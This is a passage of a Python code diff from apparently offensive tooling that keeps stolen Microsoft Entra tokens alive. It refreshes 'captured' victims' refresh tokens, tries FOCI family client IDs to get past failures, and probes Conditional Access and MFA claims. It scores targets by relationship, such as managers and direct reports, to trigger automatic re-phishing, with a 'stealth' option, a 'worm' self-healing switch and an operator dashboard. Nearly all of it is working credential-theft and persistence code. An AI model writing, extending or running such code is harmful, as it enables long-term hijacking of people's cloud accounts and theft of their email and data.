+                    and os.environ.get('ENABLE_FOCI_REFRESH', '').lower() == 'true'):
+                try:
+                    try:
+                        from evildev.harvester import FOCI_CLIENTS
+                    except Exception:
+                        from harvester import FOCI_CLIENTS
+                    for fid in FOCI_CLIENTS.keys():
+                        if fid == client_id:
+                            continue
+                        logger.info(f"Attempting FOCI family refresh using client {fid}")
+                        try:
+                            fh = TokenHarvester(
+                                client_id=fid,
+                                tenant=refresh_tenant,
+                                scopes=refresh_scopes,
+                                stealth=self._stealth,
+                            )
+                            token_data = fh.refresh_token(refresh_token)
+                            if token_data:
+                                logger.info(f"FOCI refresh succeeded using client {fid}")
+                                break
+                        except Exception:
+                            continue
+                except Exception as e:
+                    logger.debug(f"FOCI refresh attempts failed: {e}")
+
+            duration_ms = (time.time() - start_time) * 1000
+            if token_data:
+                new_refresh_token = token_data.get('refresh_token', refresh_token)
+                token_data['refresh_token'] = new_refresh_token
+                new_expires_at = _utc_now() + timedelta(seconds=token_data.get('expires_in', 3600))
+                try:
+                    nonce, ciphertext = CryptoUtils.aes_gcm_encrypt(master_key, json.dumps(token_data).encode())
+                    new_encrypted = base64.b64encode(nonce + ciphertext).decode('utf-8')
+                except Exception as e:
+                    raise RuntimeError(f'Failed to encrypt refreshed token for {email}: {e}') from e
+                execute_query(
+                    'UPDATE tokens SET encrypted_token=?, refresh_token=?, expires_at=?, captured_at=? WHERE email=?',
+                    params=(
+                        new_encrypted,
+                        None,
+                        new_expires_at.isoformat(),
+                        _utc_now().isoformat(),
+                        email,
+                    ),
+                    commit=True,
+                )
+                with self._lock:
+                    entry.encrypted_token = new_encrypted
+                    entry.refresh_token = new_refresh_token
+                    entry.expires_at = new_expires_at
+                    entry.refresh_count += 1
+                    entry.last_refresh_attempt = _utc_now()
+                    entry.consecutive_failures = 0
+                    entry.last_error = None
+                    entry.cooldown_until = None
+                    entry.next_backoff_seconds = 0.0
+                    entry.abandoned = False
+                    if self._check_token_for_ca(token_data):
+                        entry.fragile = True
+                        entry.health = TokenHealth.FRAGILE
+                    else:
+                        entry.health = TokenHealth.HEALTHY
+                self._stats['total_refreshes'] += 1
+                self._stats['successful_refreshes'] += 1
+                result = RefreshResult(
+                    success=True,
+                    health=entry.health,
+                    email=email,
+                    new_expires_at=new_expires_at,
+                    new_refresh_token=new_refresh_token,
+                    duration_ms=duration_ms,
+                )
+            else:
+                error_code, error_desc = self._parse_error(getattr(harvester, 'last_error', 'Unknown error'))
+                terminal_health = self.NON_RETRYABLE_TERMINAL_HEALTH.get(error_code)
+                if terminal_health is not None:
+                    is_dead = True
+                    requires_reauth = False
+                    health = terminal_health
+                else:
+                    probe_ca = {'ca': False}
+                    try:
+                        last_access = saved_token_data.get('access_token') if 'saved_token_data' in locals() else None
+                        if last_access:
+                            probe_ca = harvester.probe_conditional_access(last_access)
+                    except Exception:
+                        pass
+
+                    is_dead = self._is_fatal_error(error_code, error_desc)
+                    requires_reauth = self._requires_reauth(error_code, error_desc) or self._is_ca_error(error_desc)
+                    if probe_ca.get('ca'):
+                        requires_reauth = True
+                        error_desc = (error_desc or '') + f" | probe_ca:{probe_ca.get('reason')}"
+                    health = TokenHealth.DEAD if is_dead else (TokenHealth.REAUTH_REQUIRED if requires_reauth else TokenHealth.HEALTHY)
+                self._stats['total_refreshes'] += 1
+                self._stats['failed_refreshes'] += 1
+                result = RefreshResult(
+                    success=False,
+                    health=health,
+                    email=email,
+                    error_code=error_code,
+                    error_description=error_desc,
+                    error=f'{error_code}: {error_desc}',
+                    is_dead=is_dead,
+                    requires_reauth=requires_reauth,
+                    duration_ms=duration_ms,
+                )
+                if not is_dead:
+                    self._record_refresh_failure(
+                        entry,
+                        f'{error_code}: {error_desc}',
+                        health=health,
+                    )
+        except Exception as e:
+            duration_ms = (time.time() - start_time) * 1000
+            self._record_refresh_failure(entry, str(e))
+            result = RefreshResult(
+                success=False,
+                health=TokenHealth.HEALTHY,
+                email=email,
+                error_code='EXCEPTION',
+                error_description=str(e),
+                error=str(e),
+                duration_ms=duration_ms,
+            )
+        finally:
+            with self._lock:
+                entry.in_flight = False
+        if result:
+            self._finalize_refresh_result(entry, result)
+        return result
+
+    def _finalize_refresh_result(self, entry: TokenEntry, result: RefreshResult):
+        if result.is_dead and entry.health not in (
+            TokenHealth.DEAD,
+            TokenHealth.REVOKED,
+        ):
+            self._handle_dead_token(entry, result)
+        elif result.requires_reauth:
+            self._handle_reauth_required(entry, result)
+        if self._on_refresh_result:
+            try:
+                self._on_refresh_result(result)
+            except Exception as e:
+                logger.warning(f'Refresh result callback failed: {e}')
+
+    def _handle_dead_token(self, entry: TokenEntry, result: RefreshResult):
+        revoked_codes = {
+            'AADSTS50173', 'AADSTS700082', 'AADSTS700084',
+            'AADSTS700081', 'AADSTS50057',
+        }
+        error_code = (result.error_code or '').upper()
+        is_revoked = error_code in revoked_codes
+        new_health = TokenHealth.REVOKED if is_revoked else TokenHealth.DEAD
+        with self._lock:
+            was_terminal = entry.health in (TokenHealth.DEAD, TokenHealth.REVOKED)
+            if entry.health == TokenHealth.REVOKED:
+                new_health = TokenHealth.REVOKED
+            entry.health = new_health
+            entry.abandoned = True
+            entry.last_refresh_attempt = _utc_now()
+            entry.last_error = f'{result.error_code}: {result.error_description}'
+            entry.consecutive_failures = 0
+            entry.cooldown_until = None
+            entry.next_backoff_seconds = 0.0
+            if not was_terminal:
+                self._stats['dead_tokens'] += 1
+        logger.error(
+            f'Token for {entry.email} is {new_health.value.upper()}: '
+            f'{result.error_code} {result.error_description}'
+        )
+        if self._on_token_dead:
+            try:
+                self._on_token_dead(entry.email, f'{result.error_code}: {result.error_description}')
+            except Exception as e:
+                logger.warning(f'Token dead callback failed: {e}')
+
+    def _handle_reauth_required(self, entry: TokenEntry, result: RefreshResult):
+        with self._lock:
+            entry.health = TokenHealth.REAUTH_REQUIRED
+        logger.warning(f'Token for {entry.email} requires re-auth: {result.error_code}')
+        self.reauth_for_token(entry.email)
+
+    def _check_token_for_ca(self, token_data: dict) -> bool:
+        id_token = token_data.get('id_token', '')
+        if not id_token:
+            return False
+        try:
+            claims = decode_jwt(id_token) or {}
+            acrs = claims.get('acrs', []) or []
+            if any(x in acrs for x in ('c1', 'c2', 'c3')):
+                return True
+            amr = claims.get('amr', []) or []
+            if 'mfa' in amr or 'ngcmfa' in amr:
+                return True
+        except Exception:
+            pass
+        if token_data.get('foci') == '1':
+            return True
+        ext_expires_in = token_data.get('ext_expires_in', 0)
+        if ext_expires_in and ext_expires_in < 3600:
+            return True
+        return False
+
+    def _parse_error(self, error_str: str) -> Tuple[str, str]:
+        if not error_str:
+            return 'UNKNOWN', 'Unknown error'
+
+        aadsts_match = re.search(r'(AADSTS\d+)', error_str, re.IGNORECASE)
+        code = aadsts_match.group(1).upper() if aadsts_match else 'UNKNOWN'
+
+        if 'error_description' in error_str.lower():
+            json_match = re.search(r'"error_description"\s*:\s*"([^"]+)"', error_str, re.IGNORECASE)
+            if json_match:
+                desc = json_match.group(1)
+            else:
+                desc = error_str
+        elif ': ' in error_str:
+            prefix, suffix = error_str.split(': ', 1)
+            if aadsts_match and prefix.upper().endswith(code.upper()):
+                desc = suffix
+            else:
+                desc = suffix if not aadsts_match else error_str
+        else:
+            desc = error_str
+
+        desc = desc[:300]
+        return code, desc
+
+    def _is_fatal_error(self, error_code: str, error_description: str) -> bool:
+        haystack = f'{error_code} {error_description}'.upper()
+        if any(code in haystack for code in self.FATAL_ERROR_CODES):
+            return True
+        if any(code in haystack for code in self.NON_RETRYABLE_ERROR_CODES):
+            return True
+        if any(marker in haystack for marker in ('AADSTS9002313', 'AADSTS700025')):
+            return True
+        if 'INVALID_GRANT' in haystack and any(marker in haystack for marker in (
+            'TOKEN HAS EXPIRED',
+            'TOKEN IS REVOKED',
+            'REFRESH TOKEN EXPIRED',
+            'MALFORMED OR INVALID',
+        )):
+            return True
+        return False
+
+    def _requires_reauth(self, error_code: str, error_description: str) -> bool:
+        if error_code in (
+            'AADSTS54005', 'AADSTS50076',
+            'AADSTS50079', 'AADSTS50158', 'AADSTS53000',
+            'AADSTS53001', 'AADSTS53002',
+        ):
+            return True
+        if error_code == 'invalid_grant' and 'interaction_required' in error_description.lower():
+            return True
+        return False
+
+    def _is_ca_error(self, error_description: str) -> bool:
+        desc_lower = error_description.lower()
+        return any(kw in desc_lower for kw in self.CA_KEYWORDS)
+
+    def _should_auto_reauth(self, email: str) -> bool:
+        refresh_reauth_enabled = os.environ.get('TOKEN_REFRESH_SELF_HEALING_ENABLED') or os.environ.get('WORM_SELF_HEALING_ENABLED', 'true')
+        if refresh_reauth_enabled.lower() != 'true':
+            return False
+        try:
+            row = execute_query(
+                'SELECT score, relationship FROM targets WHERE email=? AND status IN (\'captured\', \'captured_brittle\')',
+                params=(email,),
+                fetch_one=True,
+            )
+            if row:
+                score, relationship = row
+                if score >= 60 or relationship in ('manager', 'direct_report'):
+                    return True
+        except Exception:
+            pass
+        return False
+
+
+class DashboardBridge:
+    def __init__(self, get_session_queue: Callable[[Optional[str]], Optional[object]]):
+        self._get_session_queue = get_session_queue
+        self._unwired_warned = False
+
+    def on_token_dead(self, email: str, reason: str):
+        event = {
+            'type': 'token_dead',
+            'email': email,
+            'reason': reason,
+            'timestamp': _utc_now().isoformat(),
+        }
+        self._broadcast(event)
+        logger.warning(f'[DASHBOARD] Token dead: {email} - {reason}')
+
+    def on_reauth_needed(self, reauth_event: ReauthEvent):
+        event = {
+            'type': 'reauth_needed',
+            'email': reauth_event.email,
+            'reason': reauth_event.reason,
+            'session_id': reauth_event.session_id,
+            'source': 'refresh',
+            'timestamp': reauth_event.timestamp.isoformat(),
+        }
+        self._broadcast(event)
+        logger.warning(f'[DASHBOARD] Reauth needed: {reauth_event.email}')
+
+    def on_refresh_result(self, result: RefreshResult):
+        event = {
+            'type': 'refresh_result',
+            'email': result.email,
+            'success': result.success,
+            'health': result.health.value,
+            'error_code': result.error_code,
+            'is_dead': result.is_dead,
+            'requires_reauth': result.requires_reauth,
+            'duration_ms': int(result.duration_ms),
+            'timestamp': _utc_now().isoformat(),
+        }
+        self._broadcast(event)
+
+    def _broadcast(self, event: Dict):
+        sessions = self._broadcast_sessions
+        if not sessions:
+            if not self._unwired_warned:
+                logger.warning(
+                    'DashboardBridge has no sessions wired; reauth/dead-token '
+                    'events will not reach the UI'
+                )
+                self._unwired_warned = True
+            return
+        for session_id, sess in list(sessions.items()):
+            q = sess.get('queue')
+            if q:
+                try:
+                    q.put_nowait(event)
+                except Exception:
+                    pass
+
+
+token_refresh_manager = TokenRefreshManager()
